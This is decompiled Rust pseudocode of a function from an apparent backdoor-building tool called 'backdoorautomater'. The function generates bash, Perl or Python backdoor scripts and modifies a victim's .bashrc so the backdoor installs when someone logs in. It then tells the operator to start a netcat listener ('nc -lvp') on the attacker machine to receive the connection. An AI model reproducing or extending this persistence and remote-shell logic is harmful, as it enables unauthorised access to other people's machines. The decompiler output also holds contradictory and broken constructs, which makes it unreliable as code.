fn backdoorautomater::shellscript::create_script(a0: i64, a1: i64, a2: i64, a3: i64, a4: u32) -> int {
    let v0: i64;  // [bp-0xf0]
    let v1: core::str::iter::Chars;  // [bp-0xe8], Other Possible Types: struct24
    let v2: u128;  // [bp-0xe8]
    let v3: u64;  // [bp-0xd8]
    let v4: u128;  // [bp-0xd0]
    let v5: u64;  // [bp-0xc0]
    let v6: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0xb8], Other Possible Types: struct24
    let v7: u64;  // [bp-0xa8]
    let v8: u128;  // [bp-0x98]
    let v9: struct24;  // [bp-0x98]
    let v10: u64;  // [bp-0x88]
    let v11: i64;  // [bp-0x78], Other Possible Types: struct24
    let v12: alloc::string::String;  // [bp-0x60]
    let v13: struct24;  // [bp-0x60]
    let v14: alloc::string::String;  // [bp-0x48]
    let v16: core::option::Option<char>;  // eax
    let v17: core::result::Result<std::process::Output, std::io::error::Error>;  // rbp
    let v18: u64;  // rax

    v1 = core::str::iter::Chars {
        iter: core::slice::iter::Iter<u8> {
            ptr: core::ptr::non_null::NonNull<u8> {
                pointer: *((a2 + 8) as &i64)
            }
            end_or_len: *((a2 + 16) as &i64) + *((a2 + 8) as &i64)
            _marker: core::marker::PhantomData<&u8> { }
        }
    };
    v16 = <core::str::iter::Chars as core::iter::traits::double_ended::DoubleEndedIterator>::next_back(&v1) as u32;
    if let Some(_) = v16 {
        if let None = v16 {
            alloc::string::String::push(a2, a1 as u8);
        }
    }
    v3 = *((a2 + 16) as &i64);
    v2 = *(a2 as &i128);
    v4 = *(a3 as &i128);
    v5 = *((a3 + 16) as &i64);
    v6 = alloc::str::join_generic_copy(&v1, 2, 1, 0);
    v10 = v7;
    v8 = *(&v6.buf.cap as &i128);
    v14 = <alloc::string::String as core::clone::Clone>::clone(a1);
    v12 = <alloc::string::String as core::clone::Clone>::clone(&v8);
    v17 = a4;
    if v17 as u8 == 3 {
        v11 = struct24 {
            field_0: *(a1 as &i128)
            field_16: *((a1 + 16) as &i64)
        };
        v6 = struct24 {
            field_0: *(v0 as &i128)
            field_16: *((v0 + 16) as &i64)
        };
        v1 = v9;
        v18 = backdoorautomater::shellscript::write_shell_bash(&v11, &v6, &v1);
    } else if v17 as u32 == 2 {
        v11 = struct24 {
            field_0: *(a1 as &i128)
            field_16: *((a1 + 16) as &i64)
        };
        v6 = struct24 {
            field_0: *(v0 as &i128)
            field_16: *((v0 + 16) as &i64)
        };
        v1 = v9;
        v18 = backdoorautomater::shellscript::write_shell_perl(&v11, &v6, &v1);
    } else if v17 as u32 == 1 {
        v11 = struct24 {
            field_0: *(a1 as &i128)
            field_16: *((a1 + 16) as &i64)
        };
        v6 = struct24 {
            field_0: *(v0 as &i128)
            field_16: *((v0 + 16) as &i64)
        };
        v1 = v9;
        v18 = backdoorautomater::shellscript::write_shell_pyfile(&v11, &v6, &v1);
    } else {
        v1 = v13;
        backdoorautomater::sanitizer::sanitize_return_fn(backdoorautomater::shellscript::modify_bashrc(&v1, v17 & 4294967295));
        println!("\n\x1b[36mGreat ! Please wait someone who connect on the machine, and your backdoor will be installed correctly\n");
        v11 = &v14;
        println!("Don't forget to put this netcat command on your attacker machine: nc -lvp {}\x1b[0m", &v11 as u128);
        return;
    }
    backdoorautomater::sanitizer::sanitize_return_fn(v18);
    v1 = v13;
    backdoorautomater::sanitizer::sanitize_return_fn(backdoorautomater::shellscript::modify_bashrc(&v1, v17 & 4294967295));
    println!("\n\x1b[36mGreat ! Please wait someone who connect on the machine, and your backdoor will be installed correctly\n");
    v11 = &v14;
    println!("Don't forget to put this netcat command on your attacker machine: nc -lvp {}\x1b[0m", &v11 as u128);
    return;
}
